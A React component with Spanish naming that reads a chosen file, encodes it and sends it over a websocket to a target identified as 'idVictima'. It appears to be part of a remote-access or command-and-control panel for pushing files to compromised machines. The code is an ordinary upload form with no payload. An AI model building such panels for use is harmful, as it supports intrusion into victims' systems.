import React, { useContext, useState, useRef } from 'react';
import { ContextHome } from "../../context/ContextHome"


function EnviarArchivo() {
    const [selectedFile, setSelectedFile] = useState(null);
    const fileInputRef = useRef();

    const { idVictima, enviarArchivo, respuestaArchivoEnviado } = useContext(ContextHome)


    const handleFileChange = (event) => {
        setSelectedFile(event.target.files[0]);
    };

    const enviarArchivoServidor = (e) => {
        e.preventDefault();
        if (selectedFile) {
            const reader = new FileReader();
    
            reader.onload = (event) => {
                let archivo = {
                    name: selectedFile.name.replace(/\s+/g, ''),
                    type: selectedFile.type,
                    size: selectedFile.size,
                    data: event.target.result
                };
                enviarArchivo(idVictima, archivo); // Asumiendo que esta función envía los datos del archivo por websocket
            };
            reader.readAsDataURL(selectedFile);
    
        } else {
            alert("Selecciona el archivo");
        }
    
        // Limpiar
        if (fileInputRef.current) {
            fileInputRef.current.value = '';
        }
    };


    return (
        <>
            {
                respuestaArchivoEnviado && (
                    <div className="alert alert-info" role="alert">
                        {respuestaArchivoEnviado}
                    </div>
                )
            }

            <div>
                <p>enviar archivos livianos</p>
                <input type="file" onChange={handleFileChange} ref={fileInputRef} />
                <button className='btn btn-danger' onClick={(e) => enviarArchivoServidor(e)}>Enviar</button>
            </div>
        </>
    )
}

export default EnviarArchivo